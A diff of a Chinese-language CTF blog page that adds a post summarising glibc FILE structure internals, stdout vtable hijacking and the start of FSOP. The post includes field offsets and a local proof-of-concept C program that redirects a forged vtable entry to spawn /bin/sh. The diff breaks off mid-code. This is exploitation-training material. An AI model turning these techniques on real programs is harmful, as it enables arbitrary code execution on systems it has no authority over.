@@ -126,17 +126,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">13</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,159 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/03/24/IO-sumup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/24/IO-sumup/" class="post-title-link" itemprop="url">IO-sumup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-24 23:07:54 / 修改时间：23:09:30" itemprop="dateCreated datePublished" datetime="2022-03-24T23:07:54+08:00">2022-03-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-sumup/" itemprop="url" rel="index"><span itemprop="name">pwn-sumup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="IO概述"><a href="#IO概述" class="headerlink" title="IO概述"></a>IO概述</h2><p>FILE结构体定义在libio.h中:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> &#123;</span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_marker</span> *_markers;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_chain;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>进程中的FILE结构通过<code>struct _IO_FILE *_chain;</code>彼此相连形成一个链表，链表头部用变量<code>_IO_list_all</code>表示，通过<code>_IO_list_all</code>可以遍历所有FILE结构.  </p>
+<p>程序的libc.so数据段中存在:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all: _IO_2_1_stderr_ -&gt; _IO_2_1_stdout_ -&gt; _IO_2_1_stdin_ -&gt; ...(0x00)</span><br></pre></td></tr></table></figure>
+<p>其中每一项的类型均为<code>_IO_FILE_plus</code>:  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span></span><br><span class="line">&#123;</span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>e.g.(复制自gdb调试题目程序)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">p _IO_2_1_stdout_</span><br><span class="line">$<span class="number">33</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72537977</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7eff61ca27e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7eff61ca27e4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7eff61ca1a00</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = <span class="number">1</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7eff61ca38c0</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7eff61ca18c0</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7eff61c9e2a0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="x64程序-IO-FILE-plus中的偏移"><a href="#x64程序-IO-FILE-plus中的偏移" class="headerlink" title="x64程序_IO_FILE_plus中的偏移:"></a>x64程序<code>_IO_FILE_plus</code>中的偏移:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode</span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>简单列举一下部分IO函数对<code>IO_jump_t</code>中函数的调用:</p>
+<ul>
+<li>fread:       _IO_file_xsgetn</li>
+<li>fwrite:      _IO_file_xsputn</li>
+<li>fclose:      _IO_file_finish</li>
+<li>printf&#x2F;puts: _IO_file_xsputn</li>
+<li>scanf&#x2F;gets:  _IO_file_xsgetn</li>
+</ul>
+<hr>
+<h4 id="vtable中函数指针的偏移"><a href="#vtable中函数指针的偏移" class="headerlink" title="vtable中函数指针的偏移:"></a>vtable中函数指针的偏移:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  **JUMP_INIT_DUMMY,                    <span class="comment">// _IO_file_jumps</span></span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),   <span class="comment">//&amp;_IO_file_jumps + 0x10</span></span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),   <span class="comment">// &amp;_IO_file_jumps + 0x38</span></span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf), <span class="comment">// &amp;_IO_file_jumps + 0x58</span></span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="libc-2-24前的利用以及FSOP"><a href="#libc-2-24前的利用以及FSOP" class="headerlink" title="libc-2.24前的利用以及FSOP"></a>libc-2.24前的利用以及FSOP</h2><p>libc数据段的vtable无法写入，考虑伪造vtable:  </p>
+<p>将_IO_FILE_plus的vtable劫持到可控制的内存，并在其中布置函数指针，较常见的是修改_IO_2_1_stdout_结构:  </p>
+<h4 id="定位-IO-2-1-stdout-结构"><a href="#定位-IO-2-1-stdout-结构" class="headerlink" title="定位_IO_2_1_stdout_结构"></a>定位_IO_2_1_stdout_结构</h4><p>若程序使用<code>setbuf</code>或<code>setvbuf</code>函数设置输入&#x2F;输出流，则程序的<code>.bss</code>段上会存在<code>stdout</code>, <code>stdin</code>, <code>stderr</code>的指针:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202020 ; FILE *stdout</span><br><span class="line">.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:0000000000000448↑o</span><br><span class="line">.bss:0000000000202020                                         ; init+18↑r</span><br><span class="line">.bss:0000000000202020                                         ; Alternative name is &#x27;stdout&#x27;</span><br><span class="line">.bss:0000000000202020                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000202028                 align 10h</span><br><span class="line">.bss:0000000000202030                 public stdin@@GLIBC_2_2_5</span><br><span class="line">.bss:0000000000202030 ; FILE *stdin</span><br><span class="line">.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000000460↑o</span><br><span class="line">.bss:0000000000202030                                         ; init+4↑r</span><br><span class="line">.bss:0000000000202030                                         ; Alternative name is &#x27;stdin&#x27;</span><br><span class="line">.bss:0000000000202030                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000202038                 align 20h</span><br><span class="line">.bss:0000000000202040                 public stderr@@GLIBC_2_2_5</span><br><span class="line">.bss:0000000000202040 ; FILE *stderr</span><br><span class="line">.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:0000000000000478↑o</span><br><span class="line">.bss:0000000000202040                                         ; init+2C↑r</span><br><span class="line">.bss:0000000000202040                                         ; Alternative name is &#x27;stderr&#x27;</span><br><span class="line">.bss:0000000000202040                                         ; Copy of shared data</span><br></pre></td></tr></table></figure>
+<p>同时libc文件中也可以直接定位_IO_2_1_stdout_:  </p>
+<p><code>libc.symbols[&#39;_IO_2_1_stdout_&#39;]</code></p>
+<p>利用时可以考虑将_IO_file_xsputn上的函数指针改到:  </p>
+<ul>
+<li>one_gadget</li>
+<li>system, 同时布置_IO_FILE_plus的第一个成员(<code>_flags</code>)改为参数”&#x2F;bin&#x2F;sh\x00”</li>
+</ul>
+<hr>
+<h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序:"></a>测试程序:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> *p1, *p2;</span><br><span class="line">  <span class="type">size_t</span> _i_2_1_stdout, *vtable, *fake_vtable, *fake_xsputn;</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] This is the addr of main_arena+88: %p\n&quot;</span>, (*(<span class="type">size_t</span> *)p1));</span><br><span class="line">  _i_2_1_stdout = (*(<span class="type">long</span> *)p1) + <span class="number">0xaa8</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] This is the addr of _IO_2_1_stdout_: %p\n&quot;</span>, (<span class="type">long</span>)(_i_2_1_stdout));</span><br><span class="line">  vtable = _i_2_1_stdout + <span class="number">0xd8</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] This is the addr of vtable: %p\n&quot;</span>, (<span class="type">long</span>)(*vtable));</span><br><span class="line">  fake_vtable = _i_2_1_stdout + <span class="number">160</span> - <span class="number">0x38</span>;</span><br><span class="line">  fake_xsputn = (<span class="type">char</span> *)fake_vtable + <span class="number">0x38</span>;</span><br><span class="line">  *(<span class="type">long</span> *)fake_xsputn = &amp;win;</span><br><span class="line">  *(<span class="type">long</span> *)vtable = fake_vtable;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;win!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><p>File Stream Oriented Programming:</p>
+<ol>
+<li>劫持<code>_IO_list_all</code>的值伪造<code>_IO_FILE</code>项</li>
+<li>调用<code>_IO_flush_all_lockp</code>刷新<code>_IO_list_all</code>链表中所有项的文件流，相当于调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code>:</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp(<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *fp;</span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    run_fp = fp;</span><br><span class="line">    <span class="keyword">if</span> (do_lock)</span><br><span class="line">      _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">     || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">         &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; 